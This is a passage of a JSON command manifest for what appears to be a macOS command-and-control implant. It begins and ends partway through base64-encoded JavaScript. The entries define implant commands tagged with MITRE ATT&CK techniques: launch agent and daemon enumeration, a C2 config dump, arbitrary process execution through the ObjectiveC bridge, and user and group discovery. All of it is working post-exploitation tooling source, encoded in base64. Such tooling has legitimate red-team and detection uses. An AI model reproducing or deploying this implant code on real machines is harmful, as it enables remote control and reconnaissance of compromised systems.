ICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJpbW1lZF9hdHRyaWJ1dGVzWydOU0ZpbGVHcm91cE93bmVyQWNjb3VudElEJ10gPSBhdHRyaWJ1dGVzWydOU0ZpbGVHcm91cE93bmVyQWNjb3VudElEJ107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJpbW1lZF9hdHRyaWJ1dGVzWydOU0ZpbGVPd25lckFjY291bnROYW1lJ10gPSBhdHRyaWJ1dGVzWydOU0ZpbGVPd25lckFjY291bnROYW1lJ107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJpbW1lZF9hdHRyaWJ1dGVzWydOU0ZpbGVDcmVhdGlvbkRhdGUnXSA9IGF0dHJpYnV0ZXNbJ05TRmlsZUNyZWF0aW9uRGF0ZSddOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBuc3Bvc2l4ID0gYXR0cmlidXRlc1snTlNGaWxlUG9zaXhQZXJtaXNzaW9ucyddOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHdlIG5lZWQgdG8gZml4IHRoaXMgbWVzcyB0byBhY3R1YWxseSBiZSByZWFsIHBlcm1pc3Npb24gYml0cyB0aGF0IG1ha2Ugc2Vuc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cmltbWVkX2F0dHJpYnV0ZXNbJ05TRmlsZVBvc2l4UGVybWlzc2lvbnMnXSA9ICgobnNwb3NpeCA+PiA2KSAmIDB4NykudG9TdHJpbmcoKSArICgobnNwb3NpeCA+PiAzKSAmIDB4NykudG9TdHJpbmcoKSArIChuc3Bvc2l4ICYgMHg3KS50b1N0cmluZygpOzsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0cmltbWVkX2F0dHJpYnV0ZXNbJ05TRmlsZUdyb3VwT3duZXJBY2NvdW50TmFtZSddID0gYXR0cmlidXRlc1snTlNGaWxlR3JvdXBPd25lckFjY291bnROYW1lJ107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJpbW1lZF9hdHRyaWJ1dGVzWydOU0ZpbGVNb2RpZmljYXRpb25EYXRlJ10gPSBhdHRyaWJ1dGVzWydOU0ZpbGVNb2RpZmljYXRpb25EYXRlJ107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgb3V0cHV0WyJzeXN0ZW1MYXVuY2hBZ2VudHMiXVtmaWxlc1tpXV1bJ1Byb2dyYW1BdHRyaWJ1dGVzJ10gPSB0cmltbWVkX2F0dHJpYnV0ZXM7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBjYXRjaChlcnJvcil7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOiJFcnJvciB0cnlpbmcgdG8gcmVhZCAvTGlicmFyeS9MYXVuY2hBZ2VudHM6ICIgKyBlcnJvci50b1N0cmluZygpLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgaWYoY29uZmlnWyd0eXBlJ10gPT09ICJyZWFkTGF1bmNoRGFlbW9ucyIpewogICAgICAgICAgICAgICAgbGV0IGZpbGVNYW5hZ2VyID0gJC5OU0ZpbGVNYW5hZ2VyLmRlZmF1bHRNYW5hZ2VyOwogICAgICAgICAgICAgICAgbGV0IHBhdGggPSAiL0xpYnJhcnkvTGF1bmNoRGFlbW9ucy8iOwogICAgICAgICAgICAgICAgbGV0IGVycm9yID0gUmVmKCk7CiAgICAgICAgICAgICAgICBvdXRwdXQgPSB7fTsKICAgICAgICAgICAgICAgIGxldCBmaWxlcyA9IGZpbGVNYW5hZ2VyLmNvbnRlbnRzT2ZEaXJlY3RvcnlBdFBhdGhFcnJvcigkKHBhdGgpLCBlcnJvcik7CiAgICAgICAgICAgICAgICB0cnl7CiAgICAgICAgICAgICAgICAgICAgLy8gbm8gZXJyb3JzLCBzbyBub3cgaXRlcmF0ZSBvdmVyIHRoZSBmaWxlcwogICAgICAgICAgICAgICAgICAgIGZpbGVzID0gT2JqQy5kZWVwVW53cmFwKGZpbGVzKTsKICAgICAgICAgICAgICAgICAgICBvdXRwdXRbInN5c3RlbUxhdW5jaERhZW1vbnMiXSA9IHt9OwogICAgICAgICAgICAgICAgICAgIGZvcihsZXQgaSBpbiBmaWxlcyl7CiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBwcmVmcyA9ICQuTlNNdXRhYmxlRGljdGlvbmFyeS5hbGxvYy5pbml0V2l0aENvbnRlbnRzT2ZGaWxlKHBhdGggKyBmaWxlc1tpXSk7CiAgICAgICAgICAgICAgICAgICAgICAgIGxldCBjb250ZW50cyA9IE9iakMuZGVlcFVud3JhcChwcmVmcyk7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKGNvbnRlbnRzID09PSB1bmRlZmluZWQpeyBjb250ZW50cyA9IHt9O30KICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHBsaXN0UGVybXMgPSBPYmpDLnVud3JhcChmaWxlTWFuYWdlci5hdHRyaWJ1dGVzT2ZJdGVtQXRQYXRoRXJyb3IoJChwYXRoICsgZmlsZXNbaV0pLCAkKCkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgbGV0IG5zcG9zaXggPSB7fTsKICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHBvc2l4ID0gIiI7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmKHBsaXN0UGVybXMgIT09IHVuZGVmaW5lZCl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBuc3Bvc2l4ID0gcGxpc3RQZXJtc1snTlNGaWxlUG9zaXhQZXJtaXNzaW9ucyddLmpzOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgcG9zaXggPSAoKG5zcG9zaXggPj4gNikgJiAweDcpLnRvU3RyaW5nKCkgKyAoKG5zcG9zaXggPj4gMykgJiAweDcpLnRvU3RyaW5nKCkgKyAobnNwb3NpeCAmIDB4NykudG9TdHJpbmcoKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKHBsaXN0UGVybXNbJ05TRmlsZUV4dGVuZGVkQXR0cmlidXRlcyddICE9PSB1bmRlZmluZWQpewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBleHRlbmRlZCA9IHt9OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBwZXJtcyA9IHBsaXN0UGVybXNbJ05TRmlsZUV4dGVuZGVkQXR0cmlidXRlcyddLmpzOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvcihsZXQgaiBpbiBwZXJtcyl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGV4dGVuZGVkW2pdID0gcGVybXNbal0uYmFzZTY0RW5jb2RlZFN0cmluZ1dpdGhPcHRpb25zKDApLmpzOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBjb250ZW50c1snUGxpc3RQZXJtaXNzaW9uc0V4dGVuZGVkQXR0cmlidXRlcyddID0gZXh0ZW5kZWQ7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgLy8gd2UgbmVlZCB0byBmaXggdGhpcyBtZXNzIHRvIGFjdHVhbGx5IGJlIHJlYWwgcGVybWlzc2lvbiBiaXRzIHRoYXQgbWFrZSBzZW5zZQogICAgICAgICAgICAgICAgICAgICAgICBjb250ZW50c1snUGxpc3RQZXJtaXNzaW9ucyddID0gcG9zaXg7CiAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dFsnc3lzdGVtTGF1bmNoRGFlbW9ucyddW2ZpbGVzW2ldXSA9IHt9OwogICAgICAgICAgICAgICAgICAgICAgICBvdXRwdXRbInN5c3RlbUxhdW5jaERhZW1vbnMiXVtmaWxlc1tpXV1bJ2NvbnRlbnRzJ10gPSBjb250ZW50czsKICAgICAgICAgICAgICAgICAgICAgICAgaWYoY29udGVudHMgIT09IHVuZGVmaW5lZCAmJiBjb250ZW50cy5oYXNPd25Qcm9wZXJ0eSgnUHJvZ3JhbUFyZ3VtZW50cycpKXsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxldCBhdHRyaWJ1dGVzID0gT2JqQy5kZWVwVW53cmFwKGZpbGVNYW5hZ2VyLmF0dHJpYnV0ZXNPZkl0ZW1BdFBhdGhFcnJvcigkKGNvbnRlbnRzWydQcm9ncmFtQXJndW1lbnRzJ11bMF0pLCAkKCkpKTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmKGF0dHJpYnV0ZXMgIT09IHVuZGVmaW5lZCl7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbGV0IHRyaW1tZWRfYXR0cmlidXRlcyA9IHt9OwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyaW1tZWRfYXR0cmlidXRlc1snTlNGaWxlT3duZXJBY2NvdW50SUQnXSA9IGF0dHJpYnV0ZXNbJ05TRmlsZU93bmVyQWNjb3VudElEJ107CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJpbW1lZF9hdHRyaWJ1dGVzWydOU0ZpbGVFeHRlbnNpb25IaWRkZW4nXSA9IGF0dHJpYnV0ZXNbJ05TRmlsZUV4dGVuc2lvbkhpZGRlbiddOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyaW1tZWRfYXR0cmlidXRlc1snTlNGaWxlR3JvdXBPd25lckFjY291bnRJRCddID0gYXR0cmlidXRlc1snTlNGaWxlR3JvdXBPd25lckFjY291bnRJRCddOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyaW1tZWRfYXR0cmlidXRlc1snTlNGaWxlT3duZXJBY2NvdW50TmFtZSddID0gYXR0cmlidXRlc1snTlNGaWxlT3duZXJBY2NvdW50TmFtZSddOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyaW1tZWRfYXR0cmlidXRlc1snTlNGaWxlQ3JlYXRpb25EYXRlJ10gPSBhdHRyaWJ1dGVzWydOU0ZpbGVDcmVhdGlvbkRhdGUnXTsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBuc3Bvc2l4ID0gYXR0cmlidXRlc1snTlNGaWxlUG9zaXhQZXJtaXNzaW9ucyddOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIHdlIG5lZWQgdG8gZml4IHRoaXMgbWVzcyB0byBhY3R1YWxseSBiZSByZWFsIHBlcm1pc3Npb24gYml0cyB0aGF0IG1ha2Ugc2Vuc2UKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwb3NpeCA9ICgobnNwb3NpeCA+PiA2KSAmIDB4NykudG9TdHJpbmcoKSArICgobnNwb3NpeCA+PiAzKSAmIDB4NykudG9TdHJpbmcoKSArIChuc3Bvc2l4ICYgMHg3KS50b1N0cmluZygpOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyaW1tZWRfYXR0cmlidXRlc1snTlNGaWxlUG9zaXhQZXJtaXNzaW9ucyddID0gcG9zaXg7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdHJpbW1lZF9hdHRyaWJ1dGVzWydOU0ZpbGVHcm91cE93bmVyQWNjb3VudE5hbWUnXSA9IGF0dHJpYnV0ZXNbJ05TRmlsZUdyb3VwT3duZXJBY2NvdW50TmFtZSddOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRyaW1tZWRfYXR0cmlidXRlc1snTlNGaWxlTW9kaWZpY2F0aW9uRGF0ZSddID0gYXR0cmlidXRlc1snTlNGaWxlTW9kaWZpY2F0aW9uRGF0ZSddOwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG91dHB1dFsic3lzdGVtTGF1bmNoRGFlbW9ucyJdW2ZpbGVzW2ldXVsnUHJvZ3JhbUF0dHJpYnV0ZXMnXSA9IHRyaW1tZWRfYXR0cmlidXRlczsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGNhdGNoKGVycm9yKXsKICAgICAgICAgICAgICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6IkZhaWxlZCB0byByZWFkIGxhdW5jaCBkYWVtb25zOiAiICsgZXJyb3IudG9TdHJpbmcoKSwgImNvbXBsZXRlZCI6IHRydWUsICJzdGF0dXMiOiAiZXJyb3IifTsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICByZXR1cm4geyJ1c2VyX291dHB1dCI6SlNPTi5zdHJpbmdpZnkob3V0cHV0LCBudWxsLCAyKSwgImNvbXBsZXRlZCI6IHRydWV9OwogICAgICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjplcnJvci50b1N0cmluZygpLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgICAgIH0KICAgIH1jYXRjaChlcnJvcil7CiAgICAgICAgcmV0dXJuIHsidXNlcl9vdXRwdXQiOmVycm9yLnRvU3RyaW5nKCksICJjb21wbGV0ZWQiOiB0cnVlLCAic3RhdHVzIjogImVycm9yIn07CiAgICB9Cn07CkNPTU1BTkRfRU5EU19IRVJFCg=="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "get_config",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "Gets the current running config via the C2 class",
          "cmd": "get_config",
          "parameters": [],
          "attack": [
            {
              "t_num": "T1082",
              "attack_name": "System Information Discovery"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "get_config.js": "ZXhwb3J0cy5nZXRfY29uZmlnID0gZnVuY3Rpb24odGFzaywgY29tbWFuZCwgcGFyYW1zKXsKICAgIGxldCBjb25maWcgPSBDMi5nZXRDb25maWcoKTsKICAgIHJldHVybiB7InVzZXJfb3V0cHV0Ijpjb25maWcsICJjb21wbGV0ZWQiOiB0cnVlfTsKfTsKQ09NTUFORF9FTkRTX0hFUkU="
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "From the GUI: run. From the cmd-line: run {\"path\":\"\/bin\/ps\",\"args\":[\"-ax\"]}",
          "version": 1,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "The command uses the ObjectiveC bridge to spawn that process with those arguments on the computer and get your output back. It is not interactive and does not go through a shell, so be sure to specify the full path to the binary you want to run.",
          "cmd": "run",
          "parameters": [
            {
              "type": "Array",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "args"
            },
            {
              "type": "String",
              "hint": "Full path to binary to execute",
              "choices": "",
              "required": true,
              "name": "path"
            }
          ],
          "attack": [
            {
              "t_num": "T1106",
              "attack_name": "Execution through API"
            }
          ],
          "artifacts": [
            {
              "command_parameter": "path",
              "artifact": "Process Create",
              "artifact_string": "*",
              "replace_string": "*"
            }
          ],
          "files": [
            {
              "run.js": "ZXhwb3J0cy5ydW4gPSBmdW5jdGlvbih0YXNrLCBjb21tYW5kLCBwYXJhbXMpewoJLy9sYXVuY2ggYSBwcm9ncmFtIGFuZCBhcmdzIHZpYSBPYmpDIGJyaWRnZSB3aXRob3V0IGRvU2hlbGxTY3JpcHQgYW5kIHJldHVybiByZXNwb25zZQogICAgbGV0IHJlc3BvbnNlID0gIiI7Cgl0cnl7CiAgICAgICAgbGV0IHBpZWNlcyA9IEpTT04ucGFyc2UocGFyYW1zKTsKICAgICAgICBsZXQgcGF0aCA9IHBpZWNlc1sncGF0aCddOwogICAgICAgIC8vY29uc29sZS5sb2cocGF0aCk7CiAgICAgICAgbGV0IGFyZ3MgPSBwaWVjZXNbJ2FyZ3MnXTsKICAgICAgICBsZXQgcGlwZSA9ICQuTlNQaXBlLnBpcGU7CgkJbGV0IGZpbGUgPSBwaXBlLmZpbGVIYW5kbGVGb3JSZWFkaW5nOyAgLy8gTlNGaWxlSGFuZGxlCgkJbGV0IHRhc2sgPSAkLk5TVGFzay5hbGxvYy5pbml0OwoJCXRhc2subGF1bmNoUGF0aCA9IHBhdGg7IC8vJy9iaW4vcHMnCgkJdGFzay5hcmd1bWVudHMgPSBhcmdzOyAvL1snYXgnXQoJCXRhc2suc3RhbmRhcmRPdXRwdXQgPSBwaXBlOyAgLy8gaWYgbm90IHNwZWNpZmllZCwgbGl0ZXJhbGx5IHdyaXRlcyB0byBmaWxlIGhhbmRsZXMgMSBhbmQgMgoJCXRhc2suc3RhbmRhcmRFcnJvciA9IHBpcGU7CgkJLy9jb25zb2xlLmxvZygiYWJvdXQgdG8gbGF1bmNoIik7CgkJdGFzay5sYXVuY2g7IC8vIFJ1biB0aGUgY29tbWFuZCAncHMgYXgnCgkJLy9jb25zb2xlLmxvZygibGF1bmNoZWQiKTsKCQlpZihhcmdzW2FyZ3MubGVuZ3RoIC0gMV0gIT09ICImIil7CgkJICAgIC8vaWYgd2UgYXJlbid0IHRhc2tpbmcgdGhpcyB0byBydW4gaW4gdGhlIGJhY2tncm91bmQsIHRoZW4gdHJ5IHRvIHJlYWQgdGhlIG91dHB1dCBmcm9tIHRoZSBwcm9ncmFtCgkJICAgIC8vICB0aGlzIHdpbGwgaGFuZyBvdXIgbWFpbiBwcm9ncmFtIHRob3VnaCBmb3Igbm93CiAgICAgICAgICAgIGxldCBkYXRhID0gZmlsZS5yZWFkRGF0YVRvRW5kT2ZGaWxlOyAgLy8gTlNEYXRhLCBwb3RlbnRpYWwgdG8gaGFuZyBoZXJlPwogICAgICAgICAgICBmaWxlLmNsb3NlRmlsZTsKICAgICAgICAgICAgcmVzcG9uc2UgPSAkLk5TU3RyaW5nLmFsbG9jLmluaXRXaXRoRGF0YUVuY29kaW5nKGRhdGEsICQuTlNVVEY4U3RyaW5nRW5jb2RpbmcpLmpzOwogICAgICAgIH0KICAgICAgICBlbHNlewogICAgICAgICAgICByZXNwb25zZSA9ICJsYXVuY2hlZCBwcm9ncmFtIjsKICAgICAgICB9CiAgICB9Y2F0Y2goZXJyb3IpewogICAgICAgIHJldHVybiB7InVzZXJfb3V0cHV0IjplcnJvci50b1N0cmluZygpLCAiY29tcGxldGVkIjogdHJ1ZSwgInN0YXR1cyI6ICJlcnJvciJ9OwogICAgfQoJcmV0dXJuIHsidXNlcl9vdXRwdXQiOnJlc3BvbnNlLCAiY29tcGxldGVkIjogdHJ1ZX07Cn07CkNPTU1BTkRfRU5EU19IRVJF"
            }
          ],
          "transforms": []
        },
        {
          "needs_admin": false,
          "help_cmd": "list_users: {\"method\": api, \"gid\": 0} or {\"groups\": true}",
          "version": 2,
          "is_exit": false,
          "is_file_browse": false,
          "file_browse_parameters": "",
          "is_process_list": false,
          "process_list_parameters": "",
          "is_download_file": false,
          "download_file_parameters": "",
          "is_remove_file": false,
          "remove_file_parameters": "",
          "is_agent_generator": false,
          "author": "",
          "deleted": false,
          "description": "This uses JXA to list the non-service user accounts on the system. You can specify a GID to look at the users of a certain group or you can specify \"groups\" to be true and enumerate users by groups",
          "cmd": "list_users",
          "parameters": [
            {
              "type": "Number",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "gid"
            },
            {
              "type": "Boolean",
              "hint": "",
              "choices": "",
              "required": false,
              "name": "groups"
            }
          ],
          "attack": [
            {
              "t_num": "T1087",
              "attack_name": "Account Discovery"
            },
            {
              "t_num": "T1069",
              "attack_name": "Permission Groups Discovery"
            }
          ],
          "artifacts": [],
          "files": [
            {
              "list_users.js": "ZXhwb3J0cy5saXN0X3VzZXJzID0gZnVuY3Rpb24odGFzaywgY29tbWFuZCwgcGFyYW1zKXsKCWxldCBhbGxfdXNlcnMgPSBbXTsKCWxldCBtZXRob2QgPSAiYXBpIjsKCWxldCBnaWQgPSAtMTsKCWxldCBncm91cHMgPSBmYWxzZTsKCWlmKHBhcmFtcy5sZW5ndGggPiAwKXsKCSAgICBsZXQgZGF0YSA9IEpTT04ucGFyc2UocGFyYW1zKTsKICAgICAgICBpZihkYXRhLmhhc093blByb3BlcnR5KCdtZXRob2QnKSAmJiBkYXRhWydtZXRob2QnXSAhPT0gIiIpewogICAgICAgICAgICBtZXRob2QgPSBkYXRhWydtZXRob2QnXTsKICAgICAgICB9CiAgICAgICAgaWYoZGF0YS5oYXNPd25Qcm9wZXJ0eSgnZ2lkJykgJiYgZGF0YVsnZ2lkJ10gIT09ICIiICYmIGRhdGFbJ2dpZCddID4gMCl7CiAgICAgICAgICAgIGdpZCA9IGRhdGFbJ2dpZCddOwogICAgICAgIH0KICAgICAgICBpZihkYXRhLmhhc093blByb3BlcnR5KCJncm91cHMiKSAmJiBkYXRhWydncm91cHMnXSAhPT0gIiIpewogICAgICAgICAgICBncm91cHMgPSBkYXRhWydncm91cHMnXTsKICAgICAgICB9Cgl9CiAgICBpZihtZXRob2QgPT09ICJhcGkiKXsKICAgICAgICBPYmpDLmltcG9ydCgnQ29sbGFib3JhdGlvbicpOwogICAgICAgIE9iakMuaW1wb3J0KCdDb3JlU2VydmljZXMnKTsKICAgICAgICAvL09iakMuYmluZEZ1bmN0aW9uKCdDRk1ha2VDb2xsZWN0YWJsZScsIFsnaWQnLCBbJ3ZvaWQqJ11dKTsKICAgICAgICBpZihnaWQgPCAwKXsKICAgICAgICAgICAgbGV0IGRlZmF1bHRBdXRob3JpdHkgPSAkLkNTR2V0TG9jYWxJZGVudGl0eUF1dGhvcml0eSgpOwogICAgICAgICAgICBsZXQgaWRlbnRpdHlDbGFzcyA9IDI7CiAgICAgICAgICAgIGlmKGdyb3Vwcyl7CiAgICAgICAgICAgICAgICBhbGxfdXNlcnMgPSBbXTsgLy8gd2Ugd2lsbCB3YW50IHRvIGRvIGEgZGljdGlvbmFyeSBzbyB3ZSBjYW4gZ3JvdXAgdGhlIG1lbWJlcnMgYnkgdGhlaXIgR0lECiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZXsKICAgICAgICAgICAgICAgIGlkZW50aXR5Q2xhc3MgPSAxOyAvL2VudW1lcmF0ZSB1c2VycwogICAgICAgICAgICB9CiAgICAgICAgICAgIGxldCBxdWVyeSA9ICQuQ1NJZGVudGl0eVF1ZXJ5Q3JlYXRlKCQoKSwgaWRlbnRpdHlDbGFzcywgZGVmYXVsdEF1dGhvcml0eSk7CiAgICAgICAgICAgIGxldCBlcnJvciA9IFJlZigpOwogICAgICAgICAgICAkLkNTSWRlbnRpdHlRdWVyeUV4ZWN1dGUocXVlcnksIDAsIGVycm9yKTsKICAgICAgICAgICAgbGV0IHJlc3VsdHMgPSAkLkNTSWRlbnRpdHlRdWVyeUNvcHlSZXN1bHRzKHF1ZXJ5KTsKICAgICAgICAgICAgbGV0IG51bVJlc3VsdHMgPSBwYXJzZUludCgkLkNGQXJyYXlHZXRDb3VudChyZXN1bHRzKSk7CiAgICAgICAgICAgIGlmKHJlc3VsdHMuanMgPT09IHVuZGVmaW5lZCl7CiAgICAgICAgICAgICAgICByZXN1bHRzID0gJC5DRk1ha2VDb2xsZWN0YWJsZShyZXN1bHRzKTsKICAgICAgICAgICAgfQogICAgICAgICAgICBmb3IobGV0IGkgPSAwOyBpIDwgbnVtUmVzdWx0czsgaSsrKXsKICAgICAgICAgICAgICAgIGxldCBpZGVudGl0eSA9IHJlc3VsdHMub2JqZWN0QXRJbmRleChpKTsvL3Jlc3VsdHNbaV07CiAgICAgICAgICAgICAgICBsZXQgaWRPYmogPSAkLkNCSWRlbnRpdHkuaWRlbnRpdHlXaXRoQ1NJZGVudGl0eShpZGVudGl0eSk7CiAgICAgICAgICAgICAgICBpZihncm91cHMpewogICAgICAgICAgICAgICAgICAgIC8vaWYgd2UncmUgbG9va2luZyBhdCBncm91cHMsIHRoZW4gd2UgaGF2ZSBhIGRpZmZlcmVudCBpbmZvIHRvIHByaW50IG91dAogICAgICAgICAgICAgICAgICAgIGFsbF91c2Vyc1tpXSA9IHt9OwogICAgICAgICAgICAgICAgICAgIGFsbF91c2Vyc1tpXVsiUE9TSVhJRCJdID0gaWRPYmoucG9zaXhHSUQ7CiAgICAgICAgICAgICAgICAgICAgYWxsX3VzZXJzW2ldWydhbGlhc2VzJ10gPSBPYmpDLmRlZXBVbndyYXAoaWRPYmouYWxpYXNlcyk7CiAgICAgICAgICAgICAgICAgICAgYWxsX3VzZXJzW2ldWydmdWxsTmFtZSddID0gT2JqQy5kZWVwVW53cmFwKGlkT2JqLmZ1bGxOYW1lKTsKICAgICAgICAgICAgICAgICAgICBhbGxfdXNlcnNbaV1bJ1BPU0lYTmFtZSddID0gT2JqQy5kZWVwVW53cmFwKGlkT2JqLnBvc2l4TmFtZSk7CiAgICAgICAgICAgICAgICAgICAgYWxsX3VzZXJzW2ldWydtZW1iZXJzJ10gPSBbXTsKICAgICAgICAgICAgICAgICAgICBsZXQgbWVtYmVycyA9IGlkT2JqLm1lbWJlcklkZW50aXRpZXMuanM7CiAgICAgICAgICAgICAgICAgICAgZm9yKGxldCBqID0gMDsgaiA8IG1lbWJlcnMubGVuZ3RoOyBqKyspewogICAgICAgICAgICAgICAgICAgICAgICBsZXQgaW5mbyA9IHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJQT1NJWE5hbWUiOiBtZW1iZXJzW2pdLnBvc2l4TmFtZS5qcywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJQT1NJWElEIjogIG1lbWJlcnNbal0ucG9zaXhVSUQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiTG9jYWxBdXRob3JpdHkiOiBtZW1iZXJzW2pdLmF1dGhvcml0eS5sb2NhbGl6ZWROYW1lLmpzLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIkZ1bGxOYW1lIjogbWVtYmVyc1tqXS5mdWxsTmFtZS5qcywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJFbWFpbHMiOiAgbWVtYmVyc1tqXS5lbWFpbEFkZHJlc3MuanMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiaXNIaWRkZW5BY2NvdW50IjogbWVtYmVyc1tqXS5pc0hpZGRlbiwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJFbmFibGVkIjogbWVtYmVyc1tqXS5pc0VuYWJsZWQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQWxpYXNlcyI6IE9iakMuZGVlcFVud3JhcChtZW1iZXJzW2pdLmFsaWFzZXMpLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIlVVSUQiOiBtZW1iZXJzW2pdLlVVSURTdHJpbmcuanMKICAgICAgICAgICAgICAgICAgICAgICAgfTsKICAgICAgICAgICAgICAgICAgICAgICAgYWxsX3VzZXJzW2ldWydtZW1iZXJzJ10ucHVzaChpbmZvKTsKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlewogICAgICAgICAgICAgICAgICAgIGxldCBpbmZvID0gewogICAgICAgICAgICAgICAgICAgICAgICAgICAgIlBPU0lYTmFtZSI6IGlkT2JqLnBvc2l4TmFtZS5qcywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJQT1NJWElEIjogIGlkT2JqLnBvc2l4VUlELAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIkxvY2FsQXV0aG9yaXR5IjogaWRPYmouYXV0aG9yaXR5LmxvY2FsaXplZE5hbWUuanMsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiRnVsbE5hbWUiOiBpZE9iai5mdWxsTmFtZS5qcywKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJFbWFpbHMiOiAgaWRPYmouZW1haWxBZGRyZXNzLmpzLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgImlzSGlkZGVuQWNjb3VudCI6IGlkT2JqLmlzSGlkZGVuLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgIkVuYWJsZWQiOiBpZE9iai5pc0VuYWJsZWQsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiQWxpYXNlcyI6IE9iakMuZGVlcFVud3JhcChpZE9iai5hbGlhc2VzKSwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJVVUlEIjogaWRPYmouVVVJRFN0cmluZy5qcwogICAgICAgICAgICAgICAgICAgICAgICB9OwogICAgICAgICAgICAgICAgICAgIGFsbF91c2Vycy5wdXNoKGluZm8pOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGVsc2V7CiAgICAgICAgICAgIGxldCBkZWZhdWx0QXV0aG9yaXR5ID0gJC5DQklkZW50aXR5QXV0aG9yaXR5LmRlZmF1bHRJZGVudGl0eUF1dGhvcml0eTsKICAgICAgICAgICAgbGV0IGdyb3VwID0gJC5DQkdyb3VwSWRlbnRpdHkuZ3JvdXBJZGVudGl0eVdpd